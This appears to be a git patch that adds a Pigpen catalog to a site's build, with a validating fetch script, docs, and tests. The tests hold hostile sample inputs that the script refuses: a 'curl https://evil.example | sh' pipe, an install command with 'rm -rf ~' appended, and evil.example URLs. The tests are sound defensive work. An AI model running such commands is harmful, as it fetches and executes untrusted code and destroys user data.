++          "Go only. Two pixel-art games, PiG Runner (/runner, /pig-runner) and Angry Pigs (/angry-pigs), moved from PiG Standard (Michael Kinsy, MIT). They draw the pig chosen with PiG's built-in /sprite (PiG 0.4.0 and later), so the Piglet bundles no login of its own. Run npm run stage before using its generated manifest under dist/staged.",
++          "Nothing starts by itself. The games register only their commands and no event handler (PIG_GAMES_MCP=1 adds a session_start handler for the opt-in agent server; /runner mcp on and /angry-pigs mcp on serve a game to an agent on 127.0.0.1 behind a random token, off by default). Both Packages (pig-runner, angry-pigs) also install on their own from a Pigpen checkout; each needs the pig-play sprite library beside it (../pig-play).",
++          "A Piglet Binary builds locally from the staged manifest with PIG_SOURCE_ROOT set to a git checkout of the PiG source. No release is published; version 0.1.0 is a development default and only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; neither is a support claim."
++        ]
++      },
++      {
++        "id": "pig-porter",
++        "kind": "piglet",
++        "name": "pig-porter",
++        "description": "Port Pi work to native PiG. Today that is Pi TypeScript extensions to Go, through the pig-extension-porter composition it extends.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-porter"
++        },
++        "manifestSha256": "8e08ba3044778f6f5145e67a54a6371ef2788239173f0d5bdf805e6193235d02",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Go only. The umbrella porter: it extends pig-extension-porter (PiG's extends), so it carries the same porting Skill and Go equivalence extension without a copy. Run npm run stage before using its generated manifest under dist/staged.",
++          "Most users porting a Pi extension should use pig-extension-porter. This is not PiG's core parity-maintenance porter. No public release or Piglet Binary is available.",
++          "pig piglet add cannot copy an extends closure, so it is not installable remotely today. See RELEASE-BLOCKERS.md."
++        ]
++      },
++      {
++        "id": "pig-typesafe",
++        "kind": "piglet",
++        "name": "pig-typesafe",
++        "description": "The typesafe_evaluate tool and /typesafe command (Go port of pi-typesafe). Off until enabled; content goes to api.typesafe.ai unless the own-model backend (the model PiG is configured with) is selected.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-typesafe"
++        },
++        "manifestSha256": "26a405aa179cb87a4ad22fa892d17028a8b943e51eee344394ce0ad8919a3aea",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Go only. Selects the pi-typesafe Package: the typesafe_evaluate tool and the /typesafe command, off until the operator enables them. Run npm run stage before using its generated manifest under dist/staged.",
++          "Content submitted goes to api.typesafe.ai unless the own-model backend is selected, which sends it to the provider of the model PiG is configured with. The Piglet says which in its consent dialog.",
++          "A Piglet Binary builds locally from the staged manifest with PIG_SOURCE_ROOT set to a git checkout of the PiG source. No release is published; version 0.1.0 is a development default and only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; neither is a support claim."
++        ]
++      },
++      {
++        "id": "pig-warden",
++        "kind": "piglet",
++        "name": "pig-warden",
++        "description": "PiG with warden: irreversible calls held before they run, off-task calls flagged, stuck loops and unverified done claims called out. Off until /warden enable; it shows what leaves the machine before anything does; judged by TypeSafe Jev or your own session model.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": false,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-warden"
++        },
++        "manifestSha256": "939ffc02fc18ceaa41a788ac647c7c0a82bb23ac722e44bb3983650e898e7c75",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Go only. Warden, a Go port of DevMortimer's pi-warden (Ryan Gapac, MIT): irreversible tool calls held before they run, off-task calls flagged, stuck loops and unverified done claims called out. Run npm run stage before using its generated manifest under dist/staged.",
++          "Opt-in: it does nothing until /warden enable, which shows what would leave the machine and asks which judge to use: TypeSafe Jev, your own session model, or offline patterns only. The warden Package also installs on its own with pig install and shares the typesafe client library Package.",
++          "A Piglet Binary builds locally from the staged manifest with PIG_SOURCE_ROOT set to a git checkout of the PiG source. No release is published; version 0.1.0 is a development default and only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; neither is a support claim."
++        ]
++      },
++      {
++        "id": "pig-with-batteries",
++        "kind": "piglet",
++        "name": "pig-with-batteries",
++        "description": "The batteries-included Piglet: default PiG with curated extensions. Today: the herdr agent-state reporter, the read_session tool, the /context, /tools, /cost and /prompts inspection commands, PiG Runner (/runner) and Angry Pigs (/angry-pigs), the Pig Snake game (/pig-snake), which start only on their command, the pig-doctor /doctor command (nothing runs unless you invoke it), Jev, a typed judge for tool calls that is off until you run /jev on, the a2a Package (A2A tools; its listener stays off until you configure it), and the websearch first slice (search, fetch, retained sources). Protocol bridges and more capability ports are planned.",
++        "maintainer": "MichaelKinsy",
++        "official": false,
++        "featured": true,
++        "status": "planned",
++        "languages": [
++          "go"
++        ],
++        "repository": "https://github.com/MichaelKinsy/pigpen",
++        "source": {
++          "type": "git",
++          "spec": "git:https://github.com/MichaelKinsy/pigpen.git",
++          "url": "https://github.com/MichaelKinsy/pigpen/tree/main/piglets/pig-with-batteries"
++        },
++        "manifestSha256": "4aa01f2ae514b2f3d29c45698f32a0165b40af82ef6555f6499bda1ba9bd65e0",
++        "releases": [],
++        "notes": [
++          "Not released yet: no signed Piglet Binary is published and no remote install command is offered. The source composition is in this repository; see RELEASE-BLOCKERS.md.",
++          "Not the finished batteries-included composition. It selects the herdr agent-state reporter (Package components/herdr, Go), PiG Runner and Angry Pigs (Packages pig-runner, angry-pigs, Go, moved from PiG Standard; they draw the pig chosen with PiG's built-in /sprite), the Pig Snake game (Package components/pig-snake, Go, starts only on /pig-snake), the read_session tool (Package components/session-ingest, Go), the /context, /tools, /cost and /prompts commands (Package components/context-info, Go; its footer is opt-in), the pig-doctor /doctor command (Package components/pig-doctor, Go; command only, nothing runs automatically), the a2a Package (Package components/a2a, Go: A2A tools, listener off until configured), the websearch first slice (Package components/websearch, Go: web_search, fetch_content, get_search_content, source_check, web_enable; the rest of pi-web-access is deferred and named in its PORT.md), plus an empty build-pipeline fixture (seed-check, Go). The roadmap is approved; capability ports are pending implementation.",
++          "The games start only on their command (/runner, /pig-runner, /angry-pigs, /pig-snake). Bundling is not activating. The sprite login and /sprite are PiG's own (built in since 0.4.0); this Piglet no longer bundles one.",
++          "It also selects Jev (components/jev), a typed judge for tool calls and output. Selectable and off by default: nothing is judged or sent until you run /jev on, which shows what leaves the machine and where. It fails open. The standalone jev Piglet and this one both build a Binary locally.",
++          "The herdr reporter does nothing unless PiG runs inside a herdr pane. Every extension in this Piglet is Go, so it needs no Node.js.",
++          "A local Piglet Binary builds with the reviewed PiG, but none is signed or published. The manifest lists five build targets, but only linux/amd64 has been built and run; linux/arm64, darwin/arm64, darwin/amd64 and windows/amd64 are listed in the manifest and compile-checked only; the targets and the 0.1.0 version are not a support or release claim.",
++          "Newer PiG builds support subdirectory source add and per-Piglet release tags, but this composition is not published and no installation command is offered yet. See RELEASE-BLOCKERS.md."
++        ]
++      }
++    ]
++  }
++}
+diff --git a/docs/catalog-sync.md b/docs/catalog-sync.md
+index 43b1164..47cef37 100644
+--- a/docs/catalog-sync.md
++++ b/docs/catalog-sync.md
+@@ -73,6 +73,26 @@ back. `NPM_CATALOG_OFFLINE=1` uses the snapshot without any request.
+ Entries other than the verified 27 link to npm and the publisher repository
+ and have no detail page here, so the export stays at its current page count.
+ 
++## Pigpen releases
++
++`/packages` also lists what the Pigpen repository has released, in two sources shown before the npm ones once they have
++entries: **Pigpen Packages** and **Pigpen Piglets**. `scripts/build-pigpen-catalog.mjs` runs in `pnpm generate` after the npm
++catalog and reads Pigpen's generated `index.json` (raw HTTPS from `catalog.config.json`: one request, no redirects, no
++credentials, 10 s, 2 MiB).
++
++| Source | Entry is listed when | Command on the card |
++| --- | --- | --- |
++| Pigpen Packages | its release tag `components/<name>/v<version>` is recorded in Pigpen | `pig install 'git:https://github.com/<repo>.git@components/<name>/v<version>#subdirectory=components%2F<name>'` |
++| Pigpen Piglets | a signed `piglet-release.json` receipt, verified in Pigpen against its pinned Ed25519 key, is committed | `pig piglet pull 'github:<repo>/<name>@<version>'`, with platforms and signing key id |
++
++Planned entries are counted but never listed. The site does not verify signatures; Pigpen does, and the site re-derives each
++command and URL from the entry's own name, version and repository and refuses the entry when the index says otherwise, so a
++hand-edited index cannot put another command on a card. The index is validated against Pigpen's schema
++(`data/pigpen-index.schema.json`; copy it from Pigpen when the schema changes). A failed fetch or an index that does not
++validate keeps the committed `data/pigpen-index.snapshot.json`, never a partial list. `PIGPEN_OFFLINE=1` uses the snapshot;
++`PIGPEN_INDEX_FILE=<file>` reads that index. `pnpm catalog:snapshot` refreshes the snapshot (review the diff). pi-in-go.dev
++hosts no downloads: Packages come from Git tags and Binaries from GitHub Releases.
++
+ ## Historical ingestion design (not the public build)
+ 
+ ## Two authorities, one static catalog
+diff --git a/package.json b/package.json
+index eb4112c..13b4860 100644
+--- a/package.json
++++ b/package.json
+@@ -9,7 +9,7 @@
+     "install:ci": "pnpm install --frozen-lockfile --ignore-scripts",
+     "pig:sync": "node scripts/sync-pig.mjs",
+     "docs:build": "node scripts/build-docs.mjs",
+-    "generate": "node scripts/sync-pig.mjs && node scripts/build-docs.mjs && node scripts/fetch-releases.mjs && node scripts/build-feed.mjs && node scripts/build-npm-catalog.mjs && node scripts/build-package-catalog.mjs",
++    "generate": "node scripts/sync-pig.mjs && node scripts/build-docs.mjs && node scripts/fetch-releases.mjs && node scripts/build-feed.mjs && node scripts/build-npm-catalog.mjs && node scripts/build-pigpen-catalog.mjs && node scripts/build-package-catalog.mjs",
+     "predev": "pnpm generate",
+     "prebuild": "pnpm generate",
+     "dev": "next dev --port 5173",
+@@ -18,8 +18,8 @@
+     "start": "node scripts/serve-static.mjs",
+     "feed:build": "node scripts/build-feed.mjs",
+     "releases:fetch": "node scripts/fetch-releases.mjs",
+-    "catalog:build": "node scripts/build-package-catalog.mjs && node scripts/build-npm-catalog.mjs",
+-    "catalog:snapshot": "node scripts/build-npm-catalog.mjs --write-snapshot",
++    "catalog:build": "node scripts/build-package-catalog.mjs && node scripts/build-npm-catalog.mjs && node scripts/build-pigpen-catalog.mjs",
++    "catalog:snapshot": "node scripts/build-npm-catalog.mjs --write-snapshot && node scripts/build-pigpen-catalog.mjs --write-snapshot",
+     "catalog:fetch": "node scripts/fetch-catalog.mjs",
+     "catalog:validate": "node scripts/validate-catalog.mjs && node docs/piglets-monorepo-seed/scripts/generate-index.mjs --check",
+     "catalog:check": "node scripts/check-catalog.mjs",
+diff --git a/scripts/build-pigpen-catalog.mjs b/scripts/build-pigpen-catalog.mjs
+new file mode 100644
+index 0000000..163aa66
+--- /dev/null
++++ b/scripts/build-pigpen-catalog.mjs
+@@ -0,0 +1,138 @@
++// Adds the Pigpen repository's released Packages and Piglets to /packages. Runs in `pnpm generate` after
++// build-npm-catalog.mjs, so every build (including the daily deploy) refreshes it.
++//
++// Source: Pigpen's generated index.json (raw HTTPS, catalog.config.json names the repository and ref). The index lists a
++// Package as `available` once its release tag is recorded, and a Piglet as `available` once a signed release receipt
++// verified against Pigpen's pinned key is committed (Pigpen's scripts/receipts.mjs does that verification, not this
++// site). This script trusts neither blindly: it validates the index against the schema Pigpen publishes
++// (data/pigpen-index.schema.json), then re-derives every command and URL from the entry's own identity and refuses the
++// entry when they differ, so a hand-edited index cannot put another command on a card. Planned entries are not listed.
++// A fetch that fails or does not validate keeps the committed snapshot (data/pigpen-index.snapshot.json), never a
++// partial list. Outputs (ignored, regenerated): public/catalog/pigpen-package.json, pigpen-piglet.json, and the two
++// sources added to data/npm-catalog.meta.json.
++//
++//   node scripts/build-pigpen-catalog.mjs                    build
++//   node scripts/build-pigpen-catalog.mjs --write-snapshot   also refresh the committed snapshot (review the diff)
++//
++// Environment: PIGPEN_OFFLINE=1 uses the snapshot without a request; PIGPEN_INDEX_FILE=<file> reads that index instead.
++import Ajv from 'ajv';
++import addFormats from 'ajv-formats';
++import { existsSync, mkdirSync, readFileSync, renameSync, writeFileSync } from 'node:fs';
++import { dirname, resolve } from 'node:path';
++import { fileURLToPath } from 'node:url';
++
++export const SOURCES = { 'pigpen-package': 'package', 'pigpen-piglet': 'piglet' };
++export const MAX_BYTES = 2 * 1024 * 1024;
++const root = fileURLToPath(new URL('../', import.meta.url));
++const path = (file) => resolve(root, file);
++const NAME = '[a-z0-9][a-z0-9.-]*';
++const VERSION = '\\d+\\.\\d+\\.\\d+(?:-[0-9A-Za-z.-]+)?';
++const escape = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
++
++const ajv = new Ajv({ allErrors: true, strictRequired: false });
++addFormats(ajv);
++const validate = ajv.compile(JSON.parse(readFileSync(path('data/pigpen-index.schema.json'), 'utf8')));
++
++/** The raw index URL for the configured repository and ref. */
++export function indexUrl(config) {
++  return `https://raw.githubusercontent.com/${config.repository}/${config.ref}/index.json`;
++}
++
++/** Validate one index and keep only what it may show. Throws on anything the schema or the re-derivation refuses. */
++export function parseIndex(text, config) {
++  if (Buffer.byteLength(text) > MAX_BYTES) throw new Error('Pigpen index is larger than 2 MiB');
++  const index = JSON.parse(text);
++  if (!validate(index)) throw new Error('Pigpen index: ' + ajv.errorsText(validate.errors));
++  const { repository } = config;
++  const owner = repository.split('/')[0];
++  const ids = new Set();
++  const out = { 'pigpen-package': [], 'pigpen-piglet': [], planned: 0 };
++  for (const entry of index.entries) {
++    if (ids.has(entry.id)) throw new Error(`Pigpen index: duplicate id ${entry.id}`);
++    ids.add(entry.id);
++    if (entry.repository !== `https://github.com/${repository}`) throw new Error(`Pigpen index: ${entry.id} is not from ${repository}`);
++    if (entry.maintainer !== owner) throw new Error(`Pigpen index: ${entry.id} has maintainer ${entry.maintainer}, not ${owner}`);
++    if (entry.status === 'planned') { out.planned += 1; continue; }
++    if (entry.kind === 'package') {
++      const spec = new RegExp(`^git:https://github\\.com/${escape(repository)}\\.git@components/(${NAME})/v(${VERSION})#subdirectory=components%2F\\1$`).exec(entry.source.spec);
++      if (!spec || spec[2] !== entry.version) throw new Error(`Pigpen index: ${entry.id} has an unexpected source ${entry.source.spec}`);
++      if (entry.installCommand !== `pig install '${entry.source.spec}'`) throw new Error(`Pigpen index: ${entry.id} has an unexpected install command`);
++      out['pigpen-package'].push({ ...base(entry, index), version: entry.version, command: entry.installCommand, types: entry.resources, sourceUrl: entry.source.url });
++    } else {
++      const [newest] = entry.releases;
++      for (const release of entry.releases) {
++        const tag = encodeURIComponent(`${entry.name}/v${release.version}`);
++        if (release.pullCommand !== `pig piglet pull 'github:${repository}/${entry.name}@${release.version}'`) throw new Error(`Pigpen index: ${entry.id} ${release.version} has an unexpected pull command`);
++        if (release.indexUrl !== `https://github.com/${repository}/releases/download/${tag}/piglet-release.json`) throw new Error(`Pigpen index: ${entry.id} ${release.version} has an unexpected release URL`);
++        if (!release.verificationKey.publicKeyUrl.startsWith(`https://raw.githubusercontent.com/${repository}/`)) throw new Error(`Pigpen index: ${entry.id} has a verification key outside ${repository}`);
++      }
++      out['pigpen-piglet'].push({ ...base(entry, index), version: newest.version, command: newest.pullCommand, types: [], platforms: newest.platforms, keyId: newest.verificationKey.id, keyUrl: newest.verificationKey.publicKeyUrl, sourceUrl: entry.source.url });
++    }
++  }
++  for (const source of Object.keys(SOURCES)) out[source].sort((a, b) => a.name.localeCompare(b.name, 'en'));
++  return out;
++}
++
++const base = (entry, index) => ({ name: entry.name, description: entry.description, author: entry.maintainer, date: new Date(index.updatedAt + 'T00:00:00Z').toISOString(), downloads: 0, repository: entry.repository });
++
++const sourceMeta = (entries, origin, syncedAt) => ({ syncedAt, origin, count: entries.length, first: entries.slice(0, 24) });
++
++/** Fetch the index: raw HTTPS, one request, no redirects, no credentials, 10 s, 2 MiB. */
++export async function fetchIndex(url, { fetchImpl = fetch } = {}) {
++  const response = await fetchImpl(url, { redirect: 'error', credentials: 'omit', headers: { accept: 'application/json', 'user-agent': 'pi-in-go.dev-build' }, signal: AbortSignal.timeout(10000) });
++  if (!response.ok) throw new Error(`${url}: HTTP ${response.status}`);
++  const length = Number(response.headers.get('content-length') ?? 0);
++  if (length > MAX_BYTES) throw new Error(`${url}: larger than 2 MiB`);
++  const text = await response.text();
++  if (Buffer.byteLength(text) > MAX_BYTES) throw new Error(`${url}: larger than 2 MiB`);
++  return text;
++}
++
++/** {parsed, origin, syncedAt, text, warnings}: the live index when it validates, else the snapshot. */
++export async function loadIndex({ config, snapshotText, offline = false, file, fetchImpl, now = new Date() }) {
++  const warnings = [];
++  if (file) return { parsed: parseIndex(readFileSync(file, 'utf8'), config), origin: 'live', syncedAt: now.toISOString(), text: readFileSync(file, 'utf8'), warnings };
++  if (!offline) {
++    try {
++      const text = await fetchIndex(indexUrl(config), { fetchImpl });
++      return { parsed: parseIndex(text, config), origin: 'live', syncedAt: now.toISOString(), text, warnings };
++    } catch (error) {
++      warnings.push(`Pigpen index not used (${error.message}); keeping the snapshot`);
++    }
++  } else warnings.push('offline mode; using the snapshot');
++  if (!snapshotText) throw new Error('Pigpen index unavailable and there is no snapshot');
++  const snapshot = JSON.parse(snapshotText);
++  return { parsed: parseIndex(JSON.stringify(snapshot.index), config), origin: 'snapshot', syncedAt: snapshot.syncedAt, text: undefined, warnings };
++}
++
++function writeAtomic(file, text) {
++  mkdirSync(dirname(file), { recursive: true });
++  writeFileSync(file + '.tmp', text);
++  renameSync(file + '.tmp', file);
++}
++
++async function main() {
++  const config = JSON.parse(readFileSync(path('catalog.config.json'), 'utf8'));
++  const snapshotFile = path('data/pigpen-index.snapshot.json');
++  const result = await loadIndex({
++    config, snapshotText: existsSync(snapshotFile) ? readFileSync(snapshotFile, 'utf8') : undefined,
++    offline: process.env.PIGPEN_OFFLINE === '1', file: process.env.PIGPEN_INDEX_FILE,
++  });
++  for (const warning of result.warnings) console.warn(`pigpen-catalog: ${warning}`);
++  const metaFile = path('data/npm-catalog.meta.json');
++  if (!existsSync(metaFile)) throw new Error('Run scripts/build-npm-catalog.mjs first: data/npm-catalog.meta.json is missing');
++  const meta = JSON.parse(readFileSync(metaFile, 'utf8'));
++  for (const source of Object.keys(SOURCES)) {
++    const entries = result.parsed[source];
++    writeAtomic(path(`public/catalog/${source}.json`), JSON.stringify({ source, syncedAt: result.syncedAt, origin: result.origin, entries }));
++    meta.sources[source] = sourceMeta(entries, result.origin, result.syncedAt);
++  }
++  writeAtomic(metaFile, JSON.stringify(meta) + '\n');
++  if (process.argv.includes('--write-snapshot')) {
++    if (result.origin !== 'live') throw new Error('refusing to write a snapshot from snapshot data');
++    writeAtomic(snapshotFile, JSON.stringify({ schemaVersion: 1, syncedAt: result.syncedAt, index: JSON.parse(result.text) }, null, 2) + '\n');
++  }
++  console.log(`pigpen-catalog: packages ${result.parsed['pigpen-package'].length}, piglets ${result.parsed['pigpen-piglet'].length}, planned ${result.parsed.planned} not listed (${result.origin})`);
++}
++
++if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) await main();
+diff --git a/test/pigpen-catalog.test.mjs b/test/pigpen-catalog.test.mjs
+new file mode 100644
+index 0000000..ecb9f04
+--- /dev/null
++++ b/test/pigpen-catalog.test.mjs
+@@ -0,0 +1,98 @@
++import assert from 'node:assert/strict';
++import { readFileSync } from 'node:fs';
++import { test } from 'node:test';
++import { loadIndex, parseIndex, indexUrl, MAX_BYTES } from '../scripts/build-pigpen-catalog.mjs';
++import { installCommand, sourceLabels } from '../app/catalog-types.ts';
++
++const config = JSON.parse(readFileSync(new URL('../catalog.config.json', import.meta.url), 'utf8'));
++const repo = config.repository;
++const snapshotText = readFileSync(new URL('../data/pigpen-index.snapshot.json', import.meta.url), 'utf8');
++const planned = JSON.parse(snapshotText).index;
++
++const spec = (name, version) => `git:https://github.com/${repo}.git@components/${name}/v${version}#subdirectory=components%2F${name}`;
++const pkg = (name = 'herdr', version = '0.1.0') => ({
++  id: 'pigpen-' + name, kind: 'package', name: 'pigpen-' + name, description: 'Reports state', maintainer: repo.split('/')[0], official: false, featured: false,
++  status: 'available', languages: ['go'], repository: 'https://github.com/' + repo,
++  source: { type: 'git', spec: spec(name, version), url: `https://github.com/${repo}/tree/components/${name}/v${version}/components/${name}` },
++  version, license: 'MIT', resources: ['extension'], installCommand: `pig install '${spec(name, version)}'`, piCompatibility: 'not-applicable', notes: ['n'],
++});
++const release = (name = 'herdr', version = '0.1.0') => ({
++  version, signed: true, indexUrl: `https://github.com/${repo}/releases/download/${encodeURIComponent(`${name}/v${version}`)}/piglet-release.json`,
++  pullCommand: `pig piglet pull 'github:${repo}/${name}@${version}'`, platforms: ['linux/amd64', 'darwin/arm64'],
++  verificationKey: { id: 'ed25519:' + 'a'.repeat(32), publicKeyUrl: `https://raw.githubusercontent.com/${repo}/main/release-keys/piglets.pub` },
++});
++const piglet = (name = 'herdr', releases = [release(name)]) => ({ ...planned.entries.find((e) => e.id === 'herdr'), id: name, name, status: 'available', releases, source: { type: 'git', spec: `git:https://github.com/${repo}.git`, url: `https://github.com/${repo}/tree/main/piglets/${name}` } });
++const index = (...entries) => JSON.stringify({ ...planned, entries });
++
++test('the committed snapshot validates and lists nothing until something is released', () => {
++  const parsed = parseIndex(snapshotText && JSON.stringify(planned), config);
++  assert.deepEqual(parsed['pigpen-package'], []);
++  assert.deepEqual(parsed['pigpen-piglet'], []);
++  assert.equal(parsed.planned, planned.entries.length);
++});
++
++test('an available Package shows the install command Pigpen published, after the site re-derives it', () => {
++  const parsed = parseIndex(index(pkg()), config);
++  const [card] = parsed['pigpen-package'];
++  assert.equal(card.command, `pig install '${spec('herdr', '0.1.0')}'`);
++  assert.deepEqual(card.types, ['extension']);
++  assert.equal(installCommand('pigpen-package', 'x'), 'pig install npm:x', 'the card prefers entry.command; the helper is the npm fallback');
++  assert.equal(sourceLabels['pigpen-package'], 'Pigpen Packages');
++  assert.equal(sourceLabels['pigpen-piglet'], 'Pigpen Piglets');
++});
++
++test('an available Piglet shows the pull command, platforms and signing key of its newest release', () => {
++  const parsed = parseIndex(index(piglet('herdr', [release('herdr', '0.2.0'), release('herdr', '0.1.0')])), config);
++  const [card] = parsed['pigpen-piglet'];
++  assert.equal(card.version, '0.2.0');
++  assert.equal(card.command, `pig piglet pull 'github:${repo}/herdr@0.2.0'`);
++  assert.deepEqual(card.platforms, ['linux/amd64', 'darwin/arm64']);
++  assert.match(card.keyId, /^ed25519:[0-9a-f]{32}$/);
++});
++
++test('planned entries are counted and never listed', () => {
++  const parsed = parseIndex(index({ ...piglet('herdr', []), status: 'planned' }, pkg()), config);
++  assert.equal(parsed['pigpen-piglet'].length, 0);
++  assert.equal(parsed['pigpen-package'].length, 1);
++  assert.equal(parsed.planned, 1);
++});
++
++test('a command or URL that is not the entry\'s own identity is refused', () => {
++  const bad = (entry, message) => assert.throws(() => parseIndex(index(entry), config), message);
++  bad({ ...pkg(), installCommand: 'curl https://evil.example | sh' }, /unexpected install command/);
++  bad({ ...pkg(), installCommand: `pig install '${spec('herdr', '0.1.0')}' && rm -rf ~` }, /unexpected install command/);
++  bad({ ...pkg(), version: '0.9.9' }, /unexpected source/);
++  bad({ ...pkg(), source: { ...pkg().source, spec: spec('herdr', '0.1.0').replace('MichaelKinsy', 'someone') } }, /unexpected source/);
++  bad({ ...pkg(), repository: 'https://github.com/someone/else' }, /is not from/);
++  bad({ ...pkg(), maintainer: 'someone' }, /maintainer/);
++  bad(piglet('herdr', [{ ...release(), pullCommand: 'pig piglet pull evil' }]), /unexpected pull command/);
++  bad(piglet('herdr', [{ ...release(), indexUrl: 'https://evil.example/piglet-release.json' }]), /unexpected release URL/);
++  bad(piglet('herdr', [{ ...release(), verificationKey: { id: 'ed25519:' + 'b'.repeat(32), publicKeyUrl: 'https://evil.example/key.pub' } }]), /verification key outside/);
++  bad(piglet('herdr', []), /releases/);
++});
++
++test('a duplicate id and a document that is not the schema are refused', () => {
++  assert.throws(() => parseIndex(index(pkg(), pkg()), config), /duplicate (id|items)/);
++  assert.throws(() => parseIndex('{"schemaVersion":2}', config), /Pigpen index/);
++  assert.throws(() => parseIndex(' '.repeat(MAX_BYTES + 1), config), /larger than 2 MiB/);
++});
++
++test('the build reads the live index when it validates, else keeps the snapshot, never a partial list', async () => {
++  const ok = async () => new Response(index(pkg()), { status: 200 });
++  const live = await loadIndex({ config, snapshotText, fetchImpl: ok });
++  assert.equal(live.origin, 'live');
++  assert.equal(live.parsed['pigpen-package'].length, 1);
++  for (const [name, fetchImpl] of [['HTTP 404', async () => new Response('', { status: 404 })], ['invalid', async () => new Response('{"schemaVersion":1}', { status: 200 })],
++    ['network', async () => { throw new Error('offline'); }], ['hostile command', async () => new Response(index({ ...pkg(), installCommand: 'x' }), { status: 200 })]]) {
++    const kept = await loadIndex({ config, snapshotText, fetchImpl });
++    assert.equal(kept.origin, 'snapshot', name);
++    assert.equal(kept.parsed['pigpen-package'].length, 0, name);
++    assert.match(kept.warnings[0], /keeping the snapshot/, name);
++  }
++  assert.equal((await loadIndex({ config, snapshotText, offline: true, fetchImpl: ok })).origin, 'snapshot');
++  await assert.rejects(loadIndex({ config, fetchImpl: async () => new Response('', { status: 500 }) }), /no snapshot/);
++});
++
++test('the index is read from the raw URL of the configured repository and ref only', () => {
++  assert.equal(indexUrl(config), `https://raw.githubusercontent.com/${repo}/${config.ref}/index.json`);
++});
+-- 
+2.43.0
+
